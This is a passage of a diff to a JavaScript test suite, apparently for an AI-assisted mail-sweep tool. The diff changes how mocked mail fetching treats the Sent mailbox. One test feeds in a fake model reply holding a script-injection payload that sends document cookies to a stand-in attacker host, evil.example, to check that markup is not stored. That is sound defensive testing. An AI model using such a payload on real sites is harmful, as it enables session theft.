   assert.equal(getKV(db, SWEEP_KV.pendingNew), '0');
 });
@@ -1401,7 +1609,7 @@ test('a run that fails on a huge error stores a bounded reason', async () => {
     deps: {
       getSecret: SECRETS,
       complete: async () => { throw new Error(huge); },
-      fetchMail: async () => [fetched()],
+      fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()],
     },
   });
   assert.equal(result.ok, false);
@@ -1424,7 +1632,7 @@ test('a model reply that is trying to be markup never reaches runs.error', async
     deps: {
       getSecret: SECRETS,
       complete: fakeModel('<script>fetch("http://evil.example/"+document.cookie)</script> sorry, no JSON here'),
-      fetchMail: async () => [fetched()],
+      fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()],
     },
   });
 
@@ -1446,7 +1654,7 @@ test('a model reply that is trying to be markup never reaches runs.error', async
     deps: {
       getSecret: SECRETS,
       complete: fakeModel('I am afraid I cannot produce that board.'),
-      fetchMail: async () => [fetched()],
+      fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()],
     },
   });
   assert.match(plain.error, /it began "I am afraid I cannot produce that board\."/);
@@ -1525,7 +1733,7 @@ test('a non-sweep spender moves the tokens and neither of the run counts', async
     db,
     config: baseConfig({ mail: [mailAccount()] }),
     mode: 'full',
-    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async ({ mailbox }) => mailbox === 'Sent' ? [] : [fetched()] },
   });
   assert.equal(swept.ok, true);
   const afterSweep = JSON.parse(getKV(db, SWEEP_KV.tokens));
